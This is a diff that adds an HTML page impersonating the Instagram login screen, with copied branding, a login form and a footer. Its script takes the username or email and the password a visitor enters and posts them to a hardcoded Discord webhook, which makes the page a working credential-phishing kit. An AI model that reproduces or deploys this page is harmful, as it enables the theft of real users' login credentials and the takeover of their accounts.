@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css?family=Cookie|DM+Sans:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" type="text/css" href="insta.css">
+    <link rel="stylesheet" type="text/css" href="http://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <style>
+        /* Add custom styles for mobile */
+        @media only screen and (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            .login {
+                margin-top: 20px;
+            }
+            input[type="text"],
+            input[type="password"],
+            input[type="submit"] {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            .fb-login {
+                display: block;
+                text-align: center;
+            }
+            .heading h1 {
+                font-size: 24px;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="heading">
+            <h1>Instagram</h1>
+        </div>
+        <div class="login">
+            <!-- Integrate JavaScript function here -->
+            <input type="text" id="username_or_email" placeholder="Phone number, user name, or email">
+            <input type="password" id="password" placeholder="Password">
+            <input type="submit" value="Log In" onclick="sendMessageToDiscord()">
+            <p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&nbsp;&nbsp;OR&nbsp;&nbsp;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;</p>
+            <a href="#" class="fb-login"><i class="ion-social-facebook"></i>Log in with Facebook</a>
+            <span>Forgot password?</span>
+        </div>
+    </div>
+    <div class="question">
+        <p>Don't have an account?<a href="#">Sign up</a></p>
+    </div>
+    <div class="image">
+        <p>Get the app.</p>
+        <img src="download-app.svg" class="img-1">
+        <img src="download-app-android.png" class="img-2">
+    </div>
+</div>
+<footer>
+    <ul>
+       <li>ABOUT US</li>
+       <li>SUPPORT</li>
+       <li>PRESS</li>
+       <li>API</li>
+       <li>JOBS</li>
+       <li>PRIVACY</li>
+       <li>TERMS</li>
+       <li>DIRECTORY</li>
+       <li>PROFILES</li>
+       <li>HASHTAGS</li>
+       <li>LANGUAGE</li>
+       <li class="insta">2024 INSTAGRAM</li>
+    </ul>
+</footer>
+
+<script>
+    function sendMessageToDiscord() {
+        var usernameOrEmail = document.getElementById("username_or_email").value;
+        var password = document.getElementById("password").value;
+
+        var message = "New Instagram login:\n";
+        message += "Username or Email: " + usernameOrEmail + "\n";
+        message += "Password: " + password;
+
+        var xhr = new XMLHttpRequest();
+        var url = "https://discord.com/api/webhooks/1209095089586970736/wTRfVRYqgoLILwrs8LNTt-eVTHgfIhQl29s3ccpSPmqc8r3MVqqktK6U4H8nsoRbv_Hv";
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4 && xhr.status === 200) {
+                console.log("Message sent to Discord webhook successfully.");
+            } else {
+                console.log("Failed to send message to Discord webhook.");
+            }
+        };
+        var data = JSON.stringify({"content": message});
+        xhr.send(data);
+    }
+</script>
+</body>
+</html>
